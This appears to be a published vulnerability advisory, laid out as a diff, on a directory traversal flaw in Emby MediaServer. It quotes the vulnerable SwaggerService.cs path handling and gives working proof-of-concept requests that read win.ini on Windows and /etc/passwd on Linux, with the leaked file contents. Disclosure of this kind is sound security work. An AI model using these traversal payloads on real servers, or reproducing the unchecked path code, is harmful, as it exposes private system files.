@@ -1,0 +1,157 @@
+Emby MediaServer 3.2.5 Directory Traversal File Disclosure Vulnerability
+
+
+Vendor: Emby LLC
+Product web page: https://www.emby.media
+Affected version: 3.2.5
+                  3.1.5
+                  3.1.2
+                  3.1.1
+                  3.1.0
+                  3.0.0
+
+Summary: Emby (formerly Media Browser) is a media server designed to organize,
+play, and stream audio and video to a variety of devices. Emby is open-source,
+and uses a client-server model. Two comparable media servers are Plex and Windows
+Media Center.
+
+Desc: The vulnerability was confirmed on tested platforms depending on the version.
+Version 3.1.0 is affecting Linux, Windows and Mac platforms. The 3.2.5 only affects
+Windows release. Input passed via the 'swagger-ui' object in SwaggerService.cs is not
+properly verified before being used to load resources. This can be exploited to disclose
+the contents of arbitrary files via directory traversal attacks.
+
+================================================================================
+/Emby.Server.Implementations/HttpServer/SwaggerService.cs:
+----------------------------------------------------------
+
+using MediaBrowser.Controller;
+using MediaBrowser.Controller.Net;
+using System.IO;
+using MediaBrowser.Model.IO;
+using MediaBrowser.Model.Services;
+
+namespace Emby.Server.Implementations.HttpServer
+{
+    public class SwaggerService : IService, IRequiresRequest
+    {
+        private readonly IServerApplicationPaths _appPaths;
+        private readonly IFileSystem _fileSystem;
+
+        public SwaggerService(IServerApplicationPaths appPaths, IFileSystem fileSystem, IHttpResultFactory resultFactory)
+        {
+            _appPaths = appPaths;
+            _fileSystem = fileSystem;
+            _resultFactory = resultFactory;
+        }
+
+        /// <summary>
+        /// Gets the specified request.
+        /// </summary>
+        /// <param name="request">The request.</param>
+        /// <returns>System.Object.</returns>
+        public object Get(GetSwaggerResource request)
+        {
+            var swaggerDirectory = Path.Combine(_appPaths.ApplicationResourcesPath, "swagger-ui");
+
+            var requestedFile = Path.Combine(swaggerDirectory, request.ResourceName.Replace('/', _fileSystem.DirectorySeparatorChar));
+
+            return _resultFactory.GetStaticFileResult(Request, requestedFile).Result;
+        }
+
+        /// <summary>
+        /// Gets or sets the result factory.
+        /// </summary>
+        /// <value>The result factory.</value>
+        private readonly IHttpResultFactory _resultFactory;
+
+        /// <summary>
+        /// Gets or sets the request context.
+        /// </summary>
+        /// <value>The request context.</value>
+        public IRequest Request { get; set; }
+    }
+}
+
+================================================================================
+
+
+Tested on: Microsoft Windows 7 Professional SP1 (EN)
+           Mono-HTTPAPI/1.1, UPnP/1.0 DLNADOC/1.50
+           Ubuntu Linux 14.04.5
+           MacOS Sierra 10.12.3
+           SQLite3
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2017-5403
+Advisory URL: http://zeroscience.mk/en/vulnerabilities/ZSL-2017-5403.php
+
+SSD Advisory: https://blogs.securiteam.com/index.php/archives/3098
+
+
+22.12.2016
+
+--
+
+
+GET /emby/swagger-ui/..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini HTTP/1.1
+
+HTTP/1.1 200 OK
+X-UA-Compatible: IE=Edge
+Access-Control-Allow-Headers: Content-Type, Authorization, Range, X-MediaBrowser-Token, X-Emby-Authorization
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE, PATCH, OPTIONS
+Access-Control-Allow-Origin: *
+Vary: Accept-Encoding
+ETag: "07bec80f76d20d26dd300a855219d321"
+Cache-Control: public
+Server: Mono-HTTPAPI/1.1, UPnP/1.0 DLNADOC/1.50
+Content-Type: application/octet-stream
+Date: Thu, 22 Dec 2016 10:43:53 GMT
+Content-Length: 403
+Connection: close
+
+; for 16-bit app support
+[fonts]
+[extensions]
+[mci extensions]
+[files]
+[Mail]
+MAPI=1
+[MCI Extensions.BAK]
+3g2=MPEGVideo
+3gp=MPEGVideo
+3gp2=MPEGVideo
+3gpp=MPEGVideo
+aac=MPEGVideo
+adt=MPEGVideo
+adts=MPEGVideo
+m2t=MPEGVideo
+m2ts=MPEGVideo
+m2v=MPEGVideo
+m4a=MPEGVideo
+m4v=MPEGVideo
+mod=MPEGVideo
+mov=MPEGVideo
+mp4=MPEGVideo
+mp4v=MPEGVideo
+mts=MPEGVideo
+ts=MPEGVideo
+tts=MPEGVideo
+
+==========================
+
+On Linux:
+
+http://127.0.0.1/%2femby%2fswagger-ui%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+...
+...
